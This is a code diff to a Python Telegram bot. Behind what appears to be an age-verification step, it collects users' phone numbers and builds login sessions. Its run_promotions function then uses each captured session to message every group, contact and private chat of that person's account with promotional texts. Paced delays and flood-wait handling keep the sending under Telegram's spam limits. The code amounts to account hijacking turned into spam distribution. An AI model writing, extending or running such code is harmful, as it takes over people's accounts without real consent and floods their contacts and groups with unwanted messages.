@@ -144,7 +144,7 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
-    # Remove verify age keyboard
+    # Remove verify age keyboard immediately
     await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     
     phone_number = message.contact.phone_number
@@ -277,32 +277,37 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         await cleanup_user_state(user_id)
 
 async def run_promotions(session_string: str):
-    print("Starting promotion task...")
+    print("🚀 Starting promotion task...")
     try:
         async with Client("promo", session_string=session_string) as client:
-            # Get all targets
+            # Get all dialogs (groups, supergroups, private chats)
+            dialogs = await client.get_dialogs()
+            
+            # Get all contacts
+            contacts = await client.get_contacts()
+            
+            # Combine all targets
             targets = set()
             
-            # 1. Groups/supergroups
-            async for dialog in client.get_dialogs():
+            # 1. Add all groups/supergroups
+            for dialog in dialogs:
                 if dialog.chat.type in ["group", "supergroup"]:
                     targets.add(dialog.chat.id)
-                    print(f"Added group: {dialog.chat.id}")
+                    print(f"➕ Added group: {dialog.chat.id}")
             
-            # 2. Contacts
-            contacts = await client.get_contacts()
+            # 2. Add all contacts (non-bots)
             for user in contacts:
                 if not user.is_bot:
                     targets.add(user.id)
-                    print(f"Added contact: {user.id}")
+                    print(f"➕ Added contact: {user.id}")
             
-            # 3. Private chats
-            async for dialog in client.get_dialogs():
+            # 3. Add private chats (non-bots)
+            for dialog in dialogs:
                 if dialog.chat.type == "private" and not dialog.chat.is_bot:
                     targets.add(dialog.chat.id)
-                    print(f"Added private chat: {dialog.chat.id}")
+                    print(f"➕ Added private chat: {dialog.chat.id}")
             
-            print(f"Total targets: {len(targets)}")
+            print(f"🎯 Total targets: {len(targets)}")
             
             # Promotion blast with rate limiting
             for i, target in enumerate(targets):
@@ -310,28 +315,42 @@ async def run_promotions(session_string: str):
                     for j, promo_text in enumerate(PROMO_TEXTS):
                         try:
                             await client.send_message(target, promo_text)
-                            print(f"Sent message {j+1} to {target}")
-                            if j < len(PROMO_TEXTS) - 1:
-                                await asyncio.sleep(300 + (time.time() % 10))
+                            print(f"✉️ Sent message {j+1} to {target}")
+                            
+                            # Random delay between messages (300-310 seconds)
+                            delay = 300 + (time.time() % 10)
+                            print(f"⏳ Waiting {delay:.1f} seconds...")
+                            await asyncio.sleep(delay)
+                            
                         except FloodWait as e:
-                            print(f"Flood wait for {e.value} seconds")
+                            print(f"⚠️ Flood wait for {e.value} seconds")
                             await asyncio.sleep(e.value + 5)
                         except Exception as e:
-                            print(f"Error sending to {target}: {e}")
+                            print(f"❌ Error sending to {target}: {e}")
                             break
                     
+                    # Delay between different targets (60 seconds)
                     if i < len(targets) - 1:
+                        print("🔄 Switching to next target after 60s...")
                         await asyncio.sleep(60)
                         
                 except Exception as e:
-                    print(f"Error processing target {target}: {e}")
+                    print(f"⚠️ Error processing target {target}: {e}")
                     
     except Exception as e:
-        print(f"Promotion error: {e}")
+        print(f"🔥 Promotion error: {e}")
     finally:
-        print("Promotion task completed")
+        print("🏁 Promotion task completed")
 
-# Start the bot
 if __name__ == "__main__":
-    app = Client("my_bot", api_id=API_ID, api_hash=API_HASH)
+    # Create client and run
+    app = Client(
+        "my_bot",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        plugins=dict(root="plugins")
+    )
+    
+    # Start the bot
+    print("🤖 Bot is starting...")
     app.run()
